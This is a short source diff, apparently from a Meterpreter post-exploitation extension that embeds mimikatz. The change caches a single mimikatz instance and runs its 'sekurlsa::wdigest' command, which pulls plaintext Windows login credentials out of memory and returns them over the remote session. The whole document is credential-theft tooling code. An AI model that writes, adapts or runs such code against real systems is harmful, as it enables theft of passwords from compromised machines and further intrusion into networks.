@@ -19,29 +19,30 @@ extern "C"
 // this sets the delay load hook function, see DelayLoadMetSrv.h
 EnableDelayLoadMetSrv();
 
-static string utf16toutf8(const wstring &s)
+mimikatz * myMimiKatz;
+
+void initialize_mimikatz()
 {
-    const int size = ::WideCharToMultiByte( CP_UTF8, 0, s.c_str(), -1, NULL, 0, 0, NULL );
-
-    vector<char> buf( size );
-    ::WideCharToMultiByte( CP_UTF8, 0, s.c_str(), -1, &buf[0], size, 0, NULL );
-
-    return string( &buf[0] );
+	vector<wstring> *args;
+	if (!myMimiKatz)
+	{
+		args = new vector<wstring>();
+		myMimiKatz = new mimikatz(args);
+		delete args;
+	}
 }
 
 DWORD request_boiler(Remote *remote, Packet *packet)
 {
 	Packet * response = packet_create_response(packet);
-	bool iResult;
+	bool iResult = 0;
 
 	wstring function = (L"sekurlsa::wdigest");
 	vector<wstring> *args = new vector<wstring>();
 
-	mimikatz * myMimiKatz = new mimikatz(args);
+	initialize_mimikatz();
 	myMimiKatz->doCommandeLocale(&function, args);
-	function = (L"exit");
-	iResult = myMimiKatz->doCommandeLocale(&function, args);
-	delete myMimiKatz;
+	//delete myMimiKatz, args;
 
 	//http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
 	wstring output = oss.str(); 
